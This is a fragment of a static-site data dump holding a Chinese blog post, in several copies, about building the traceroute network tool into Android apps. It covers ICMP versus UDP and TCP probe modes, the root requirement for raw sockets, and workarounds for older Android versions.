src=\"https://cdn.sspai.com/2023/02/27/2f70b884ea93a3f897baff5eeb05c00a.png\" alt=\"image-20230227210347006\"></p>\n<p><img src=\"https://cdn.sspai.com/2023/02/27/867802e2f5542451c96578a3885647db.png\" alt=\"image-20230227211124863\"></p>\n<p>当然，我不会忘了开源：<a href=\"https://github.com/ysy950803/FpsSwitcher\">FpsSwitcher</a>，你也可以在酷安下载到成品：<a href=\"https://www.coolapk.com/apk/285746\">MIUI 帧率开关</a></p>\n"},{"layout":"post","title":"在Android应用中集成使用traceroute工具","subtitle":"又是些莫名其妙的版本兼容问题。","date":"2023-05-04T16:00:00.000Z","author":"YSY","header-style":"text","catalog":true,"cover":"https://imgconvert.csdnimg.cn/b04cf6079ba04e7eb960c293d45fe951.png","_content":"\n### 背景知识\n\ntraceroute是一个常用于Linux系统的网络工具，它可显示数据包在IP网络中所经过路由的IP地址，理想状态下可探测本机和目标地址之间的所有路由节点。\n\n其他操作系统中也有类似的替代品，实现都大同小异。一般用法如下：\n\n```bash\n终端输入：\n~ traceroute -I baidu.com\n输出：\ntraceroute to baidu.com (39.156.66.10), 30 hops max, 60 byte packets\n 1  9.102.191.130 (9.102.191.130)  0.638 ms  0.797 ms *\n 2  * 9.102.250.222 (9.102.250.222)  0.745 ms  0.943 ms\n 3  * * *\n 4  10.200.46.253 (10.200.46.253)  1.332 ms  1.333 ms  1.332 ms\n 5  * * *\n 6  39.156.0.85 (39.156.0.85)  4.384 ms  4.184 ms  3.936 ms\n 7  111.13.188.38 (111.13.188.38)  8.991 ms  9.029 ms  9.065 ms\n 8  39.156.27.1 (39.156.27.1)  4.281 ms  4.366 ms  4.377 ms\n 9  39.156.67.1 (39.156.67.1)  3.550 ms  3.561 ms  3.568 ms\n10  * * *\n11  * * *\n12  * * *\n13  * * *\n14  39.156.66.10 (39.156.66.10)  3.973 ms  3.957 ms  4.015 ms\n```\n\n上面例子一共有14行输出结果，我们可称之为14跳，说明数据包途径了14个节点就到达了目标机器。每一跳会发送3个数据包，所以有3个对应的时间。\n\n具体的实现原理可以直接参考[Wikipedia](https://zh.wikipedia.org/wiki/Traceroute)，主要是通过不断改变TTL值来发包实现的：\n\n> 程序是利用增加存活时间（TTL）值来实现其功能的。每当数据包经过一个路由器，其存活时间就会减1。当其存活时间是0时，主机便取消数据包，并发送一个ICMP TTL数据包给原数据包的发出者。\n> 程序发出的首3个数据包TTL值是1，之后3个是2，如此类推，它便得到一连串数据包路径。注意IP不保证每个数据包走的路径都一样。\n\n### 集成到Android应用\n\nLinux实现版本的源码在此：[Traceroute for Linux](https://sourceforge.net/projects/traceroute/files/traceroute/)，可以看到居然2023年还有一次更新。既然是Linux上的程序，有没有办法在Android上运行呢？或者直接集成到App的模块中？\n\n因为Android系统本身没有预装traceroute命令工具（就算是在Linux上，大多发行版也是需要自己额外安装的），所以不能直接通过执行命令的方式来调用。**通过NDK编译traceroute源码到App中才是比较靠谱的办法。**\n\n总的来说还是比较简单的，集成上述的Linux版本源码并添加相应的mk文件，就可以编译成库了。其实已经有开源网友实现了，GitHub上也有不少例子，这个[traceroute-for-android](https://github.com/wangjing53406/traceroute-for-android)较为完美，其中的library模块可以直接参考使用，甚至可以替换其中的traceroute源码为2023年最新版，也是没有问题的。\n\n### 一些问题\n\n#### 为什么同一跳会出现不同的IP地址\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/b04cf6079ba04e7eb960c293d45fe951.png)\n\n在如图这个例子中，第4跳出现了一个不同的IP，很多人会比较疑惑。这是因为**网络环境是不断变化的，发包过程中会选择更好的路由**，可以参考[这个链接](https://www.baeldung.com/linux/traceroute-three-stars)中的解释：\n\n> Line 8 shows that some probes take different paths at the same step: the first and third probes go through 96.112.146.26, while the second probe goes through 96.112.146.22. This is because network conditions are constantly changing, which affects the routing tables. Here, the router 96.112.146.22 was a better choice for a brief period of time, so the previous one chose it in the second probe.\n\n#### 为什么要用“-I”参数\n\n实际使用中我们会发现，很多主流的域名都无法成功trace到最终目标，最后几跳往往以星号结束，表示节点机器没有回应。这是为什么呢？\n\n因为traceroute工具默认是发送UDP包来探测的，在当今这个复杂的互联网环境下，很多服务器都会因为安全机制拦截过滤掉UDP包，发送方得不到任何返回信息。所以在文章开头，你可以注意到我使用了“-I”参数，而不是默认无参。\n\n在[Traceroute for Linux源码文档](https://traceroute.sourceforge.net/)中可以得知，此工具有多种发包方式，除了默认的UDP外，还可以用TCP、ICMP发包，后两者分别对应“-T”和“-I”参数，效果会比UDP好很多。\n\n那么为什么我不使用更不容易被过滤的TCP发包呢？因为在非ROOT权限下，执行“-T”参数会有如下报错：\n\n> You do not have enough privileges to use this traceroute method.\n> socket: Operation not permitted\n\n加sudo执行才不会报错。因为traceroute在使用TCP模式发包时会创建原始套接字，参考其源码：\n\n```cpp\nstatic int tcp_init (const sockaddr_any *dest,\n\t\t\t    unsigned int port_seq, size_t *packet_len_p) {\n  ...\n\t/*  Create raw socket for tcp   */\n\traw_sk = socket (af, SOCK_RAW, IPPROTO_TCP);\n\tif (raw_sk < 0)\n\t\terror_or_perm (\"socket\");\n  ...\n}\n```\n\n参考[自从学会原始套接字之后，我感觉掌握了整个世界](https://juejin.cn/post/6927974019421601806)，原始套接字必须有ROOT权限才能使用：\n\n> 因为网络级IP数据包没有”端口“的概念，所以可以读取网络设备传入的所有数据包，这意味着什么？意味着安全性，使用了原始套接字的应用程序可以读取所有进入系统的网络数据包，也就是我们可以捕获其他应用程序的数据包，所以为了防止这种情况的发生，Linux要求所有访问原始套接字的程序都必须以root身份运行。\n\n我们把traceroute编译到Android的App中，运行环境就在应用层，默认是没有ROOT权限的，所以“-T”参数自然也就用不了。\n\n#### 低版本Android系统连“-I”也用不了\n\n经过一些兼容性测试（覆盖了6.0及以上的所有大版本），我发现在Android 9.0及以下的系统中即便是“-I”参数也会执行失败，错误信息包含“socket bind”之类的，也就是说不同Android版本的socket函数库可能实现不同，才导致了低版本连ICMP发包都不行。\n\n解决办法有两种：\n\n1. 判断Android系统版本，在9.0及以下使用默认无参的traceroute，降级到UDP发包；10.0及以后使用“-I”参数。\n2. 通过ping命令工具来模拟traceroute，因为ping工具是Android系统默认就预装了的，可以直接在Java层通过调用命令的方式执行，其次ping本身也有参数项来设置TTL值，且默认就用ICMP发包。为此我也做了一个简单的实现，可参考：[TraceRouteByPing](https://github.com/ysy950803/traceroute-for-android/blob/master/library/src/main/java/com/wandroid/traceroute/TraceRouteByPing.java)\n","source":"_posts/2023-05-05-在Android应用中集成使用traceroute工具.md","raw":"---\nlayout:     post\ntitle:      在Android应用中集成使用traceroute工具\nsubtitle:   又是些莫名其妙的版本兼容问题。\ndate:       2023-05-05\nauthor:     YSY\nheader-style: text\ncatalog: true\ncover: https://imgconvert.csdnimg.cn/b04cf6079ba04e7eb960c293d45fe951.png\ntags:\n    - Android\n    - Linux\n---\n\n### 背景知识\n\ntraceroute是一个常用于Linux系统的网络工具，它可显示数据包在IP网络中所经过路由的IP地址，理想状态下可探测本机和目标地址之间的所有路由节点。\n\n其他操作系统中也有类似的替代品，实现都大同小异。一般用法如下：\n\n```bash\n终端输入：\n~ traceroute -I baidu.com\n输出：\ntraceroute to baidu.com (39.156.66.10), 30 hops max, 60 byte packets\n 1  9.102.191.130 (9.102.191.130)  0.638 ms  0.797 ms *\n 2  * 9.102.250.222 (9.102.250.222)  0.745 ms  0.943 ms\n 3  * * *\n 4  10.200.46.253 (10.200.46.253)  1.332 ms  1.333 ms  1.332 ms\n 5  * * *\n 6  39.156.0.85 (39.156.0.85)  4.384 ms  4.184 ms  3.936 ms\n 7  111.13.188.38 (111.13.188.38)  8.991 ms  9.029 ms  9.065 ms\n 8  39.156.27.1 (39.156.27.1)  4.281 ms  4.366 ms  4.377 ms\n 9  39.156.67.1 (39.156.67.1)  3.550 ms  3.561 ms  3.568 ms\n10  * * *\n11  * * *\n12  * * *\n13  * * *\n14  39.156.66.10 (39.156.66.10)  3.973 ms  3.957 ms  4.015 ms\n```\n\n上面例子一共有14行输出结果，我们可称之为14跳，说明数据包途径了14个节点就到达了目标机器。每一跳会发送3个数据包，所以有3个对应的时间。\n\n具体的实现原理可以直接参考[Wikipedia](https://zh.wikipedia.org/wiki/Traceroute)，主要是通过不断改变TTL值来发包实现的：\n\n> 程序是利用增加存活时间（TTL）值来实现其功能的。每当数据包经过一个路由器，其存活时间就会减1。当其存活时间是0时，主机便取消数据包，并发送一个ICMP TTL数据包给原数据包的发出者。\n> 程序发出的首3个数据包TTL值是1，之后3个是2，如此类推，它便得到一连串数据包路径。注意IP不保证每个数据包走的路径都一样。\n\n### 集成到Android应用\n\nLinux实现版本的源码在此：[Traceroute for Linux](https://sourceforge.net/projects/traceroute/files/traceroute/)，可以看到居然2023年还有一次更新。既然是Linux上的程序，有没有办法在Android上运行呢？或者直接集成到App的模块中？\n\n因为Android系统本身没有预装traceroute命令工具（就算是在Linux上，大多发行版也是需要自己额外安装的），所以不能直接通过执行命令的方式来调用。**通过NDK编译traceroute源码到App中才是比较靠谱的办法。**\n\n总的来说还是比较简单的，集成上述的Linux版本源码并添加相应的mk文件，就可以编译成库了。其实已经有开源网友实现了，GitHub上也有不少例子，这个[traceroute-for-android](https://github.com/wangjing53406/traceroute-for-android)较为完美，其中的library模块可以直接参考使用，甚至可以替换其中的traceroute源码为2023年最新版，也是没有问题的。\n\n### 一些问题\n\n#### 为什么同一跳会出现不同的IP地址\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/b04cf6079ba04e7eb960c293d45fe951.png)\n\n在如图这个例子中，第4跳出现了一个不同的IP，很多人会比较疑惑。这是因为**网络环境是不断变化的，发包过程中会选择更好的路由**，可以参考[这个链接](https://www.baeldung.com/linux/traceroute-three-stars)中的解释：\n\n> Line 8 shows that some probes take different paths at the same step: the first and third probes go through 96.112.146.26, while the second probe goes through 96.112.146.22. This is because network conditions are constantly changing, which affects the routing tables. Here, the router 96.112.146.22 was a better choice for a brief period of time, so the previous one chose it in the second probe.\n\n#### 为什么要用“-I”参数\n\n实际使用中我们会发现，很多主流的域名都无法成功trace到最终目标，最后几跳往往以星号结束，表示节点机器没有回应。这是为什么呢？\n\n因为traceroute工具默认是发送UDP包来探测的，在当今这个复杂的互联网环境下，很多服务器都会因为安全机制拦截过滤掉UDP包，发送方得不到任何返回信息。所以在文章开头，你可以注意到我使用了“-I”参数，而不是默认无参。\n\n在[Traceroute for Linux源码文档](https://traceroute.sourceforge.net/)中可以得知，此工具有多种发包方式，除了默认的UDP外，还可以用TCP、ICMP发包，后两者分别对应“-T”和“-I”参数，效果会比UDP好很多。\n\n那么为什么我不使用更不容易被过滤的TCP发包呢？因为在非ROOT权限下，执行“-T”参数会有如下报错：\n\n> You do not have enough privileges to use this traceroute method.\n> socket: Operation not permitted\n\n加sudo执行才不会报错。因为traceroute在使用TCP模式发包时会创建原始套接字，参考其源码：\n\n```cpp\nstatic int tcp_init (const sockaddr_any *dest,\n\t\t\t    unsigned int port_seq, size_t *packet_len_p) {\n  ...\n\t/*  Create raw socket for tcp   */\n\traw_sk = socket (af, SOCK_RAW, IPPROTO_TCP);\n\tif (raw_sk < 0)\n\t\terror_or_perm (\"socket\");\n  ...\n}\n```\n\n参考[自从学会原始套接字之后，我感觉掌握了整个世界](https://juejin.cn/post/6927974019421601806)，原始套接字必须有ROOT权限才能使用：\n\n> 因为网络级IP数据包没有”端口“的概念，所以可以读取网络设备传入的所有数据包，这意味着什么？意味着安全性，使用了原始套接字的应用程序可以读取所有进入系统的网络数据包，也就是我们可以捕获其他应用程序的数据包，所以为了防止这种情况的发生，Linux要求所有访问原始套接字的程序都必须以root身份运行。\n\n我们把traceroute编译到Android的App中，运行环境就在应用层，默认是没有ROOT权限的，所以“-T”参数自然也就用不了。\n\n#### 低版本Android系统连“-I”也用不了\n\n经过一些兼容性测试（覆盖了6.0及以上的所有大版本），我发现在Android 9.0及以下的系统中即便是“-I”参数也会执行失败，错误信息包含“socket bind”之类的，也就是说不同Android版本的socket函数库可能实现不同，才导致了低版本连ICMP发包都不行。\n\n解决办法有两种：\n\n1. 判断Android系统版本，在9.0及以下使用默认无参的traceroute，降级到UDP发包；10.0及以后使用“-I”参数。\n2. 通过ping命令工具来模拟traceroute，因为ping工具是Android系统默认就预装了的，可以直接在Java层通过调用命令的方式执行，其次ping本身也有参数项来设置TTL值，且默认就用ICMP发包。为此我也做了一个简单的实现，可参考：[TraceRouteByPing](https://github.com/ysy950803/traceroute-for-android/blob/master/library/src/main/java/com/wandroid/traceroute/TraceRouteByPing.java)\n","slug":"在Android应用中集成使用traceroute工具","published":1,"updated":"2024-03-25T07:31:26.043Z","comments":1,"photos":[],"link":"","_id":"cluaufh1o005athe614x81p2u","content":"<h3 id=\"背景知识\"><a href=\"#背景知识\" class=\"headerlink\" title=\"背景知识\"></a>背景知识</h3><p>traceroute是一个常用于Linux系统的网络工具，它可显示数据包在IP网络中所经过路由的IP地址，理想状态下可探测本机和目标地址之间的所有路由节点。</p>\n<p>其他操作系统中也有类似的替代品，实现都大同小异。一般用法如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">终端输入：</span><br><span class=\"line\">~ traceroute -I baidu.com</span><br><span class=\"line\">输出：</span><br><span class=\"line\">traceroute to baidu.com (39.156.66.10), 30 hops max, 60 byte packets</span><br><span class=\"line\"> 1  9.102.191.130 (9.102.191.130)  0.638 ms  0.797 ms *</span><br><span class=\"line\"> 2  * 9.102.250.222 (9.102.250.222)  0.745 ms  0.943 ms</span><br><span class=\"line\"> 3  * * *</span><br><span class=\"line\"> 4  10.200.46.253 (10.200.46.253)  1.332 ms  1.333 ms  1.332 ms</span><br><span class=\"line\"> 5  * * *</span><br><span class=\"line\"> 6  39.156.0.85 (39.156.0.85)  4.384 ms  4.184 ms  3.936 ms</span><br><span class=\"line\"> 7  111.13.188.38 (111.13.188.38)  8.991 ms  9.029 ms  9.065 ms</span><br><span class=\"line\"> 8  39.156.27.1 (39.156.27.1)  4.281 ms  4.366 ms  4.377 ms</span><br><span class=\"line\"> 9  39.156.67.1 (39.156.67.1)  3.550 ms  3.561 ms  3.568 ms</span><br><span class=\"line\">10  * * *</span><br><span class=\"line\">11  * * *</span><br><span class=\"line\">12  * * *</span><br><span class=\"line\">13  * * *</span><br><span class=\"line\">14  39.156.66.10 (39.156.66.10)  3.973 ms  3.957 ms  4.015 ms</span><br></pre></td></tr></table></figure>\n\n<p>上面例子一共有14行输出结果，我们可称之为14跳，说明数据包途径了14个节点就到达了目标机器。每一跳会发送3个数据包，所以有3个对应的时间。</p>\n<p>具体的实现原理可以直接参考<a href=\"https://zh.wikipedia.org/wiki/Traceroute\">Wikipedia</a>，主要是通过不断改变TTL值来发包实现的：</p>\n<blockquote>\n<p>程序是利用增加存活时间（TTL）值来实现其功能的。每当数据包经过一个路由器，其存活时间就会减1。当其存活时间是0时，主机便取消数据包，并发送一个ICMP TTL数据包给原数据包的发出者。<br>程序发出的首3个数据包TTL值是1，之后3个是2，如此类推，它便得到一连串数据包路径。注意IP不保证每个数据包走的路径都一样。</p>\n</blockquote>\n<h3 id=\"集成到Android应用\"><a href=\"#集成到Android应用\" class=\"headerlink\" title=\"集成到Android应用\"></a>集成到Android应用</h3><p>Linux实现版本的源码在此：<a href=\"https://sourceforge.net/projects/traceroute/files/traceroute/\">Traceroute for Linux</a>，可以看到居然2023年还有一次更新。既然是Linux上的程序，有没有办法在Android上运行呢？或者直接集成到App的模块中？</p>\n<p>因为Android系统本身没有预装traceroute命令工具（就算是在Linux上，大多发行版也是需要自己额外安装的），所以不能直接通过执行命令的方式来调用。<strong>通过NDK编译traceroute源码到App中才是比较靠谱的办法。</strong></p>\n<p>总的来说还是比较简单的，集成上述的Linux版本源码并添加相应的mk文件，就可以编译成库了。其实已经有开源网友实现了，GitHub上也有不少例子，这个<a href=\"https://github.com/wangjing53406/traceroute-for-android\">traceroute-for-android</a>较为完美，其中的library模块可以直接参考使用，甚至可以替换其中的traceroute源码为2023年最新版，也是没有问题的。</p>\n<h3 id=\"一些问题\"><a href=\"#一些问题\" class=\"headerlink\" title=\"一些问题\"></a>一些问题</h3><h4 id=\"为什么同一跳会出现不同的IP地址\"><a href=\"#为什么同一跳会出现不同的IP地址\" class=\"headerlink\" title=\"为什么同一跳会出现不同的IP地址\"></a>为什么同一跳会出现不同的IP地址</h4><p><img src=\"https://imgconvert.csdnimg.cn/b04cf6079ba04e7eb960c293d45fe951.png\" alt=\"在这里插入图片描述\"></p>\n<p>在如图这个例子中，第4跳出现了一个不同的IP，很多人会比较疑惑。这是因为<strong>网络环境是不断变化的，发包过程中会选择更好的路由</strong>，可以参考<a href=\"https://www.baeldung.com/linux/traceroute-three-stars\">这个链接</a>中的解释：</p>\n<blockquote>\n<p>Line 8 shows that some probes take different paths at the same step: the first and third probes go through 96.112.146.26, while the second probe goes through 96.112.146.22. This is because network conditions are constantly changing, which affects the routing tables. Here, the router 96.112.146.22 was a better choice for a brief period of time, so the previous one chose it in the second probe.</p>\n</blockquote>\n<h4 id=\"为什么要用“-I”参数\"><a href=\"#为什么要用“-I”参数\" class=\"headerlink\" title=\"为什么要用“-I”参数\"></a>为什么要用“-I”参数</h4><p>实际使用中我们会发现，很多主流的域名都无法成功trace到最终目标，最后几跳往往以星号结束，表示节点机器没有回应。这是为什么呢？</p>\n<p>因为traceroute工具默认是发送UDP包来探测的，在当今这个复杂的互联网环境下，很多服务器都会因为安全机制拦截过滤掉UDP包，发送方得不到任何返回信息。所以在文章开头，你可以注意到我使用了“-I”参数，而不是默认无参。</p>\n<p>在<a href=\"https://traceroute.sourceforge.net/\">Traceroute for Linux源码文档</a>中可以得知，此工具有多种发包方式，除了默认的UDP外，还可以用TCP、ICMP发包，后两者分别对应“-T”和“-I”参数，效果会比UDP好很多。</p>\n<p>那么为什么我不使用更不容易被过滤的TCP发包呢？因为在非ROOT权限下，执行“-T”参数会有如下报错：</p>\n<blockquote>\n<p>You do not have enough privileges to use this traceroute method.<br>socket: Operation not permitted</p>\n</blockquote>\n<p>加sudo执行才不会报错。因为traceroute在使用TCP模式发包时会创建原始套接字，参考其源码：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">tcp_init</span> <span class=\"params\">(<span class=\"type\">const</span> sockaddr_any *dest,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t\t\t    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> port_seq, <span class=\"type\">size_t</span> *packet_len_p)</span> </span>&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">\t<span class=\"comment\">/*  Create raw socket for tcp   */</span></span><br><span class=\"line\">\traw_sk = <span class=\"built_in\">socket</span> (af, SOCK_RAW, IPPROTO_TCP);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (raw_sk &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"built_in\">error_or_perm</span> (<span class=\"string\">&quot;socket&quot;</span>);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>参考<a href=\"https://juejin.cn/post/6927974019421601806\">自从学会原始套接字之后，我感觉掌握了整个世界</a>，原始套接字必须有ROOT权限才能使用：</p>\n<blockquote>\n<p>因为网络级IP数据包没有”端口“的概念，所以可以读取网络设备传入的所有数据包，这意味着什么？意味着安全性，使用了原始套接字的应用程序可以读取所有进入系统的网络数据包，也就是我们可以捕获其他应用程序的数据包，所以为了防止这种情况的发生，Linux要求所有访问原始套接字的程序都必须以root身份运行。</p>\n</blockquote>\n<p>我们把traceroute编译到Android的App中，运行环境就在应用层，默认是没有ROOT权限的，所以“-T”参数自然也就用不了。</p>\n<h4 id=\"低版本Android系统连“-I”也用不了\"><a href=\"#低版本Android系统连“-I”也用不了\" class=\"headerlink\" title=\"低版本Android系统连“-I”也用不了\"></a>低版本Android系统连“-I”也用不了</h4><p>经过一些兼容性测试（覆盖了6.0及以上的所有大版本），我发现在Android 9.0及以下的系统中即便是“-I”参数也会执行失败，错误信息包含“socket bind”之类的，也就是说不同Android版本的socket函数库可能实现不同，才导致了低版本连ICMP发包都不行。</p>\n<p>解决办法有两种：</p>\n<ol>\n<li>判断Android系统版本，在9.0及以下使用默认无参的traceroute，降级到UDP发包；10.0及以后使用“-I”参数。</li>\n<li>通过ping命令工具来模拟traceroute，因为ping工具是Android系统默认就预装了的，可以直接在Java层通过调用命令的方式执行，其次ping本身也有参数项来设置TTL值，且默认就用ICMP发包。为此我也做了一个简单的实现，可参考：<a href=\"https://github.com/ysy950803/traceroute-for-android/blob/master/library/src/main/java/com/wandroid/traceroute/TraceRouteByPing.java\">TraceRouteByPing</a></li>\n</ol>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover_type":"img","excerpt":"","more":"<h3 id=\"背景知识\"><a href=\"#背景知识\" class=\"headerlink\" title=\"背景知识\"></a>背景知识</h3><p>traceroute是一个常用于Linux系统的网络工具，它可显示数据包在IP网络中所经过路由的IP地址，理想状态下可探测本机和目标地址之间的所有路由节点。</p>\n<p>其他操作系统中也有类似的替代品，实现都大同小异。一般用法如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">终端输入：</span><br><span class=\"line\">~ traceroute -I baidu.com</span><br><span class=\"line\">输出：</span><br><span class=\"line\">traceroute to baidu.com (39.156.66.10), 30 hops max, 60 byte packets</span><br><span class=\"line\"> 1  9.102.191.130 (9.102.191.130)  0.638 ms  0.797 ms *</span><br><span class=\"line\"> 2  * 9.102.250.222 (9.102.250.222)  0.745 ms  0.943 ms</span><br><span class=\"line\"> 3  * * *</span><br><span class=\"line\"> 4  10.200.46.253 (10.200.46.253)  1.332 ms  1.333 ms  1.332 ms</span><br><span class=\"line\"> 5  * * *</span><br><span class=\"line\"> 6  39.156.0.85 (39.156.0.85)  4.384 ms  4.184 ms  3.936 ms</span><br><span class=\"line\"> 7  111.13.188.38 (111.13.188.38)  8.991 ms  9.029 ms  9.065 ms</span><br><span class=\"line\"> 8  39.156.27.1 (39.156.27.1)  4.281 ms  4.366 ms  4.377 ms</span><br><span class=\"line\"> 9  39.156.67.1 (39.156.67.1)  3.550 ms  3.561 ms  3.568 ms</span><br><span class=\"line\">10  * * *</span><br><span class=\"line\">11  * * *</span><br><span class=\"line\">12  * * *</span><br><span class=\"line\">13  * * *</span><br><span class=\"line\">14  39.156.66.10 (39.156.66.10)  3.973 ms  3.957 ms  4.015 ms</span><br></pre></td></tr></table></figure>\n\n<p>上面例子一共有14行输出结果，我们可称之为14跳，说明数据包途径了14个节点就到达了目标机器。每一跳会发送3个数据包，所以有3个对应的时间。</p>\n<p>具体的实现原理可以直接参考<a href=\"https://zh.wikipedia.org/wiki/Traceroute\">Wikipedia</a>，主要是通过不断改变TTL值来发包实现的：</p>\n<blockquote>\n<p>程序是利用增加存活时间（TTL）值来实现其功能的。每当数据包经过一个路由器，其存活时间就会减1。当其存活时间是0时，主机便取消数据包，并发送一个ICMP TTL数据包给原数据包的发出者。<br>程序发出的首3个数据包TTL值是1，之后3个是2，如此类推，它便得到一连串数据包路径。注意IP不保证每个数据包走的路径都一样。</p>\n</blockquote>\n<h3 id=\"集成到Android应用\"><a href=\"#集成到Android应用\" class=\"headerlink\" title=\"集成到Android应用\"></a>集成到Android应用</h3><p>Linux实现版本的源码在此：<a href=\"https://sourceforge.net/projects/traceroute/files/traceroute/\">Traceroute for Linux</a>，可以看到居然2023年还有一次更新。既然是Linux上的程序，有没有办法在Android上运行呢？或者直接集成到App的模块中？</p>\n<p>因为Android系统本身没有预装traceroute命令工具（就算是在Linux上，大多发行版也是需要自己额外安装的），所以不能直接通过执行命令的方式来调用。<strong>通过NDK编译traceroute源码到App中才是比较靠谱的办法。</strong></p>\n<p>总的来说还是比较简单的，集成上述的Linux版本源码并添加相应的mk文件，就可以编译成库了。其实已经有开源网友实现了，GitHub上也有不少例子，这个<a href=\"https://github.com/wangjing53406/traceroute-for-android\">traceroute-for-android</a>较为完美，其中的library模块可以直接参考使用，甚至可以替换其中的traceroute源码为2023年最新版，也是没有问题的。</p>\n<h3 id=\"一些问题\"><a href=\"#一些问题\" class=\"headerlink\" title=\"一些问题\"></a>一些问题</h3><h4 id=\"为什么同一跳会出现不同的IP地址\"><a href=\"#为什么同一跳会出现不同的IP地址\" class=\"headerlink\" title=\"为什么同一跳会出现不同的IP地址\"></a>为什么同一跳会出现不同的IP地址</h4><p><img src=\"https://imgconvert.csdnimg.cn/b04cf6079ba04e7eb960c293d45fe951.png\" alt=\"在这里插入图片描述\"></p>\n<p>在如图这个例子中，第4跳出现了一个不同的IP，很多人会比较疑惑。这是因为<strong>网络环境是不断变化的，发包过程中会选择更好的路由</strong>，可以参考<a href=\"https://www.baeldung.com/linux/traceroute-three-stars\">这个链接</a>中的解释：</p>\n<blockquote>\n<p>Line 8 shows that some probes take different paths at the same step: the first and third probes go through 96.112.146.26, while the second probe goes through 96.112.146.22. This is because network conditions are constantly changing, which affects the routing tables. Here, the router 96.112.146.22 was a better choice for a brief period of time, so the previous one chose it in the second probe.</p>\n</blockquote>\n<h4 id=\"为什么要用“-I”参数\"><a href=\"#为什么要用“-I”参数\" class=\"headerlink\" title=\"为什么要用“-I”参数\"></a>为什么要用“-I”参数</h4><p>实际使用中我们会发现，很多主流的域名都无法成功trace到最终目标，最后几跳往往以星号结束，表示节点机器没有回应。这是为什么呢？</p>\n<p>因为traceroute工具默认是发送UDP包来探测的，在当今这个复杂的互联网环境下，很多服务器都会因为安全机制拦截过滤掉UDP包，发送方得不到任何返回信息。所以在文章开头，你可以注意到我使用了“-I”参数，而不是默认无参。</p>\n<p>在<a href=\"https://traceroute.sourceforge.net/\">Traceroute for Linux源码文档</a>中可以得知，此工具有多种发包方式，除了默认的UDP外，还可以用TCP、ICMP发包，后两者分别对应“-T”和“-I”参数，效果会比UDP好很多。</p>\n<p>那么为什么我不使用更不容易被过滤的TCP发包呢？因为在非ROOT权限下，执行“-T”参数会有如下报错：</p>\n<blockquote>\n<p>You do not have enough privileges to use this traceroute method.<br>socket: Operation not permitted</p>\n</blockquote>\n<p>加sudo执行才不会报错。因为traceroute在使用TCP模式发包时会创建原始套接字，参考其源码：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">tcp_init</span> <span class=\"params\">(<span class=\"type\">const</span> sockaddr_any *dest,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">\t\t\t    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> port_seq, <span class=\"type\">size_t</span> *packet_len_p)</span> </span>&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">\t<span class=\"comment\">/*  Create raw socket for tcp   */</span></span><br><span class=\"line\">\traw_sk = <span class=\"built_in\">socket</span> (af, SOCK_RAW, IPPROTO_TCP);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (raw_sk &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"built_in\">error_or_perm</span> (<span class=\"string\">&quot;socket&quot;</span>);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>参考<a 